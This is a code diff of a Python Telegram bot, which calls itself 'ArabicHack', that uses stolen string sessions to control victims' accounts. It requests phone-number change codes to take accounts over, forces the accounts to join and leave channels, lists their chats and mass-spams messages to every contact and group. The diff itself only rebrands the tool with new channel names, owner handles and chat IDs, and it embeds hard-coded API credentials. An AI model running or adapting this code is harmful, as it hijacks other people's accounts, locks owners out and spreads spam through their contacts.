@@ -33,19 +33,19 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@SESSIONSUPPORT"))
+      await bot(join("@G8M8G"))
     except BaseException:
       pass
     try:
-      await bot(join("@S8Y8S"))
+      await bot(join("@E_x_Z"))
     except BaseException:
       pass
     try:
-      await bot(leave("@IndianUpdateChannel"))
+      await bot(leave("@LL1XX"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Ids_Holder"))
+      await bot(leave("@E_z_X"))
     except BaseException:
       pass
     try: 
@@ -62,19 +62,19 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@SESSIONSUPPORT"))
+      await bot(join("@G8M8G"))
     except BaseException:
       pass
     try:
-      await bot(join("@S8Y8S"))
+      await bot(join("@E_x_Z"))
     except BaseException:
       pass
     try:
-      await bot(leave("@IndianUpdateChannel"))
+      await bot(leave("@LL1XX"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Ids_Holder"))
+      await bot(leave("@E_z_X"))
     except BaseException:
       pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -92,7 +92,7 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("@SESSIONSUPPORT"))
+      await X(join("@G8M8G"))
     except BaseException:
       pass
     try:
@@ -344,19 +344,19 @@ async def userbans(strses, grp):
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@SESSIONSUPPORT"))
+      await X(join("@G8M8G"))
     except BaseException:
       pass
     try:
-      await X(join("@S8Y8S"))
+      await X(join("@E_x_Z"))
     except BaseException:
       pass
     try:
-      await X(leave("@IndianUpdateChannel"))
+      await X(leave("@LL1XX"))
     except BaseException:
       pass
     try:
-      await X(leave("@Ids_Holder"))
+      await X(leave("@E_z_X"))
     except BaseException:
       pass
     k = await X(pc())
@@ -373,7 +373,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "S8Y8S"
+channel = "LL1XX"
 menu = '''
 
 **"A" :~ [Check user own groups and channels]
@@ -407,7 +407,7 @@ menu = '''
 I will add more features Later 😅**
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN SUPPORT @SESSIONSUPPORT⚜**
+**⚜NOTICE FIRST JOIN SUPPORT @G8M8G⚜**
 '''
 
 keyboard = [
@@ -432,7 +432,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/B_8_1")
+    Button.url("Owner", "https://t.me/G_5_G")
     ]
 ]
 
@@ -442,14 +442,14 @@ async def op(event):
   if not event.is_private:
     ArabicHack = [
       [
-        Button.url("Click Here", f"https://t.me/SESSIONHACKABOT?start=hack")
+        Button.url("Click Here", f"https://t.me/SOURCEEMPTYBoT?start=hack")
         ]
       ]         
     await event.reply("Click Below To Use Me", buttons=ArabicHack)
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/S8Y8S")
+        Button.url("Must Join", f"https://t.me/LL1XX")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -459,7 +459,7 @@ async def op(event):
 async def op(event):
   ArabicHack = [
     [
-      Button.url("Click Here", f"https://t.me/SESSIONHACKABOT")
+      Button.url("Click Here", f"https://t.me/SOURCEEMPTYBoT")
       ]
     ]         
   await event.reply("Click Below To Use Me", buttons=ArabicHack)
@@ -490,7 +490,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Owner", "https://t.me/B_8_1")
+        Button.url("Owner", "https://t.me/G_5_G")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -511,7 +511,7 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @B_8_1")
+        file.write(i + "\n\nDetails BY @G_5_G")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -707,7 +707,7 @@ async def users(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @SESSIONSUPPORT\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @G8M8G\n**LOGS**\n" + str(e))
 
 
 
@@ -720,7 +720,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("Owner", "https://t.me/B_8_1")
+        Button.url("Owner", "https://t.me/G_5_G")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
@@ -737,7 +737,7 @@ async def gcasta(strses, msg):
                 chat = aman.id
                 try:
                     await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
+                    if lol != -1680216305:
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
@@ -756,7 +756,7 @@ async def gcasta(strses, msg):
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
-                    elif chat == -1001606996743:
+                    elif chat == -1680216305:
                         pass
                     await asyncio.sleep()
                 except Exception as e:
@@ -793,7 +793,7 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001606996743:
+                        if chat != -1680216305:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
                             await X.send_message(chat, tol, file=file)
@@ -881,7 +881,7 @@ async def gcastb(strses, msg):
                             while molb != False:
                                 await asyncio.sleep(600)
                                 await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001606996743:
+                        elif chat == -1680216305:
                             pass
                     except Exception as e:
                         print(e)
@@ -940,5 +940,5 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
-print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @SESSIONSUPPORT")
+print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @G8M8G")
 client.run_until_disconnected()
